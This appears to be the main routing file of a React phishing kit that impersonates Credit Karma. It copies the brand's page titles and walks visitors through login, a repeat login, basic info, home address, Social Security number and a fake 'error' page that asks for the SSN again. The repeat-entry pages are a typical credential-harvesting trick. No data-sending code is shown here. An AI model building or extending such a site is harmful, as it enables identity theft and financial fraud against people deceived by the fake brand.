import { useEffect, useState } from 'react';
import { Route, Routes, useLocation } from 'react-router-dom';

import Loader from './common/Loader';

import DefaultLayout from './layout/DefaultLayout';
import PageTitle from './components/PageTitle';
import LoginPage from './pages/UserData/LoginPage';
import LoginPageRepeat from './pages/UserData/LoginPageRepeat';
import BasicInfoPage from './pages/UserData/BasicInfoPage';
import HomeAddressPage from './pages/UserData/HomeAddressPage';
import SocialSecurityPage from './pages/UserData/SocialSecurityPage';
import SocialSecurityRepeatPage from './pages/UserData/SocialSecurityRepeatPage';
import TermsPage from './pages/UserData/TermsPage';

const hiddenOnRoutes = ['/', '/login', '/basic-info', '/home-address', '/social-security', '/social-security-error', "/terms-conditions"];

function App() {
  const [loading, setLoading] = useState<boolean>(true);
  const { pathname } = useLocation();

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [pathname]);

  useEffect(() => {
    setTimeout(() => setLoading(false), 1000);
  }, []);

  return loading ? (
    <Loader />
  ) : (
    <DefaultLayout pathname={pathname} hiddenOnRoutes={hiddenOnRoutes}>
      <Routes>
        <Route
          path="/"
          element={
            <>
              <PageTitle title="Log in - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma" />
              <LoginPage />
            </>
          }
        />

        <Route
          path="/login"
          element={
            <>
              <PageTitle title="Log in - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma" />
              <LoginPageRepeat />
            </>
          }
        />

        <Route
          path="/basic-info"
          element={
            <>
              <PageTitle title="Baisc info - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma" />
              <BasicInfoPage />
            </>
          }
        />

        <Route
          path="/home-address"
          element={
            <>
              <PageTitle title="Home Address info - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma" />
              <HomeAddressPage />
            </>
          }
        />

<Route
          path="/social-security"
          element={
            <>
              <PageTitle title="Social Security - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma" />
              <SocialSecurityPage />
            </>
          }
        />


<Route
          path="/social-security-error"
          element={
            <>
              <PageTitle title="Social Security - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma" />
              <SocialSecurityRepeatPage />
            </>
          }
        />



<Route
          path="/terms-conditions"
          element={
            <>
              <PageTitle title="Terms & Conditions - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma" />
              <TermsPage />
            </>
          }
        />
      </Routes>
    </DefaultLayout>
  );
}

export default App;
